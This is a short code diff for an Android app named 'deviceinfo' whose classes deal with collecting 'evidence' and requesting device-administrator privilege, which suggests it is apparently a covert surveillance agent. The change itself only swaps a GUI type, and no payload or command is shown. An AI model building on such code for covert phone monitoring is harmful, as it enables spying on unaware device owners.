@@ -34,6 +34,7 @@ import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
+import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.gui.DeviceAdminRequest;
 import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.listener.BSm;
@@ -230,7 +231,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}			
 		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
-			DeviceAdminRequest gui = Status.getAppGui();
+			AGUI gui = Status.getAppGui();
 			
 			if (gui!=null){
 				if (Cfg.DEBUG) {
